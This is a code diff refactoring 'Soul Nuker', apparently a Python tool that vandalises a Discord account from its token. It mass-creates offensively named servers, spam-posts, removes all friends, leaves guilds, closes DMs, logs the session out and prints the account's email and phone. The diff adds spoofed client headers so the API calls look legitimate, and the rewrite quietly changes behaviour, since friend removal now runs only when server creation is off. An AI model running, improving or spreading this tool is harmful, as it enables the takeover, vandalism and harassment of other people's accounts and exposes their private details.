@@ -7,12 +7,16 @@ ctypes.windll.kernel32.SetConsoleTitleW("Soul Nuker | v1 ~ by array")
 colorama.init(autoreset=True)
 should_exit = False
 
-# settings
-flash_screen = True
-create_guilds = True
-delete_guilds = True
-close_dms = True
-remove_friends = True
+SETTINGS = {
+    "flash_screen": True,
+    "create_guilds": True,
+    "delete_guilds": True,
+    "close_dms": True,
+    "remove_friends": True,
+}
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 def c_time():
     time_now = datetime.now()
@@ -20,7 +24,23 @@ def c_time():
     return current_time
 
 def get_headers(token):
-    headers = {'Authorization': token}
+    headers = {
+        "Authorization": token,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+        "Connection": "keep-alive",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "https://discordapp.com/channels/@me",
+        "Origin": "https://discordapp.com",
+        "Content-Type": "application/json",
+        "Accept": "*/*",
+        "DNT": "1",
+        "TE": "Trailers",
+        "Pragma": "no-cache",
+        "Cache-Control": "no-cache",
+        "X-Super-Properties": "eyJvcyI6IkxpbnV4IiwiYnJvd3NlciI6IkRpc2NvcmQgQ2xpZW50IiwicmVsZWFzZV9jaGFubmVsIjoiZGlzY29yZCIsInJlZmVycmVyIjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS8ifQ=="
+    }
+
     return headers
 
 def funny_flash(token):
@@ -89,122 +109,83 @@ def nuke_guilds(token):
     print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Done leaving guilds')
 
 def nuke_account(token, message):
-    global should_exit
     headers = get_headers(token)
 
     # get user info
-    r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
-    if r.status_code != 200:
-        print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error getting user info: {r.status_code} {r.text}')
+    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
+    if response.status_code != 200:
+        print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error getting user info: {response.status_code} {response.text}')
         return
 
-    user_id = r.json()['id']
-
-    if create_guilds:
+    if SETTINGS["create_guilds"]:
         # Create servers
         for i in range(30):
             payload = {
                 'name': f'FUCKED BY SOUL NUKER-{i}',
                 'region': 'us-west'
             }
-            r = requests.post('https://discord.com/api/v9/guilds', headers=headers, json=payload)
-            if r.status_code == 201:
-                server_id = r.json()['id']
+            response = requests.post('https://discord.com/api/v9/guilds', headers=headers, json=payload)
+            if response.status_code == 201:
+                server_id = response.json()['id']
                 print(f'{Fore.LIGHTGREEN_EX}[{c_time()}]{Fore.WHITE} Created server {server_id}')
-                payload = {
-                    'content': message
-                }
-                requests.post(f'https://discord.com/api/v9/channels/{server_id}/messages', headers=headers,
-                                json=payload)
-            elif r.status_code == 429:
-                retry_after = r.headers.get('retry-after')
+
+                payload = {'content': message}
+                response = requests.post(f'https://discord.com/api/v9/channels/{server_id}/messages', headers=headers, json=payload)
+
+            elif response.status_code == 429:
+                retry_after = response.headers.get('retry-after')
                 print(f'{Fore.LIGHTYELLOW_EX}[{c_time()}]{Fore.WHITE} Rate limited, retry after {retry_after} seconds')
                 time.sleep(int(retry_after) + 1)
+                
             else:
-                print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error creating server: {r.status_code} {r.text}')
+                print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error creating server: {response.status_code} {response.text}')
 
         print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Done creating guilds')
 
 
-    if remove_friends:
+    elif SETTINGS["remove_friends"]:
         # Delete all friends
-        r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
-        if r.status_code == 200:
-            for relationship in r.json():
+        response = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
+        if response.status_code == 200:
+            for relationship in response.json():
                 requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{relationship["id"]}', headers=headers)
                 print(f'{Fore.LIGHTGREEN_EX}[{c_time()}]{Fore.WHITE} Removed friend: {relationship["id"]}')
-
-        print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Done removing all friends')
+        print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Finished removing all friends')
 
     # Close session
     requests.post('https://discord.com/api/v9/auth/logout', headers=headers)
     print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Nuke complete')
-    should_exit = True
 
+def toggle_setting(setting):
+    SETTINGS[setting] = not SETTINGS[setting]
 
-def settings():
-    os.system('cls')
-    global flash_screen, create_guilds, delete_guilds, close_dms, remove_friends
-
+def display_settings():
+    clear_screen()
     sel = ["1", "2", "3", "4", "5", "return", "0"]
     print(f"""
     
-        [1] Flash screen: {flash_screen}
-        [2] Create servers: {create_guilds}
-        [3] Remove servers: {delete_guilds}
-        [4] Close dms: {close_dms}
-        [5] Remove friends: {remove_friends}
+        [1] Flash screen: {SETTINGS['flash_screen']}
+        [2] Create servers: {SETTINGS['create_guilds']}
+        [3] Remove servers: {SETTINGS['delete_guilds']}
+        [4] Close dms: {SETTINGS['close_dms']}
+        [5] Remove friends: {SETTINGS['remove_friends']}
     
         To change type the number of the setting.
         To return type the "return" or "0".
         
     """)
-
-    # busted ass menu
     x = input("     [?] ")
     if x not in sel:
-        os.system('cls')
-        settings()
-    elif x == "1":
-        if flash_screen:
-            flash_screen = False
-            settings()
-        elif flash_screen == False:
-            flash_screen = True
-            settings()
-    elif x == "2":
-        if create_guilds:
-            create_guilds = False
-            settings()
-        elif create_guilds == False:
-            create_guilds = True
-            settings()
-    elif x == "3":
-        if delete_guilds:
-            delete_guilds = False
-            settings()
-        elif delete_guilds == False:
-            delete_guilds = True
-            settings()
-    elif x == "4":
-        if close_dms:
-            close_dms = False
-            settings()
-        elif close_dms == False:
-            close_dms = True
-            settings()
-    elif x == "5":
-        if remove_friends:
-            remove_friends = False
-            settings()
-        elif remove_friends == False:
-            remove_friends = True
-            settings()
-    elif x == "return" or x == "0":
-        os.system('cls')
-        menu()
+        clear_screen()
+        display_settings()
+    elif x in ["1", "2", "3", "4", "5"]:
+        toggle_setting(list(SETTINGS.keys())[int(x)-1])
+        display_settings()
+    elif x in ["return", "0"]:
+        clear_screen()
+        display_menu()
 
-def menu():
+def display_menu():
     tabs = ["1", "2", "3"]
     print(f"""
 {Fore.LIGHTBLACK_EX}
@@ -222,63 +203,69 @@ def menu():
         
     """)
 
-    # busted ass menu
+    # Display and validate user input
     x = input(f"    {Fore.LIGHTBLACK_EX}[?]{Fore.WHITE} ")
     if x not in tabs:
-        os.system('cls')
-        menu()
+        clear_screen()
+        display_menu()
     elif x == "1":
-        os.system('cls')
+        clear_screen()
         nuke_button()
     elif x == "2":
-        os.system('cls')
-        settings()
+        clear_screen()
+        display_settings()
     elif x == "3":
-        os.system('cls')
+        clear_screen()
         info_token()
 
 def info_token():
-    token = input("[?] Token: ")
-
-    response = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token))
-    if response.status_code != 200:
-        print("[-] Token invalid, please try again")
-        time.sleep(2)
-        info_token()
-
-    user_info = response.json()
+    while True:
+        token = input("[?] Token: ")
+        response = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token))
+        
+        if response.status_code == 200:
+            try:
+                user_info = response.json()
+            except json.decoder.JSONDecodeError as e:
+                print(f"[-] Error decoding JSON: {e}")
+                continue
+                
+            break
+        else:
+            print("[-] Token invalid, please try again")
 
     print("[+] User Info:")
-    print(f" - ID: {user_info['id']}")
-    print(f" - Username: {user_info['username']}#{user_info['discriminator']}")
-    print(f" - Email: {user_info['email']}")
-    print(f" - Phone: {user_info['phone']}")
-    print(f" - Avatar URL: {user_info['avatar']}")
-    print(f" - Flags: {user_info['flags']}")
-    print(f" - Locale: {user_info['locale']}")
-    print(f" - Verified: {user_info['verified']}")
-    print(f" - MFA Enabled: {user_info['mfa_enabled']}")
-    input("\n[!] Press anything to return")
-    os.system('cls')
-    menu()
+    print(f" - ID:              {user_info['id']}")
+    print(f" - Username:        {user_info['username']}#{user_info['discriminator']}")
+    print(f" - Email:           {user_info['email'] or 'N/A'}")
+    print(f" - Phone:           {user_info['phone'] or 'N/A'}")
+    print(f" - Avatar URL:      {user_info['avatar']}")
+    print(f" - Flags:           {user_info['flags']}")
+    print(f" - Locale:          {user_info['locale']}")
+    print(f" - Verified:        {user_info['verified']}")
+    print(f" - MFA Enabled:     {user_info['mfa_enabled']}")
+    
+    input("\n[!] Press any key to return")
+    clear_screen()
+    display_menu()
 
 def nuke_button():
     token = input("[?] Token: ")
 
     response = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token))
     if response.status_code == 200:
-        if close_dms:
+        if SETTINGS["close_dms"]:
             message = input("[?] Spam message (leave blank for no spam before closing): ")
         else:
             message = ''
 
-        if flash_screen:
+        if SETTINGS["flash_screen"]:
             flash = threading.Thread(target=funny_flash, args=(token,))
             flash.start()
-        elif close_dms:
+        elif SETTINGS["close_dms"]:
             close_dm = threading.Thread(target=close_dms_spam, args=(token, message,))
             close_dm.start()
-        elif delete_guilds:
+        elif SETTINGS["delete_guilds"]:
             remove_guilds = threading.Thread(target=nuke_guilds, args=(token,))
             remove_guilds.start()
 
@@ -288,4 +275,4 @@ def nuke_button():
         time.sleep(2)
         nuke_button()
 
-menu()
+display_menu()
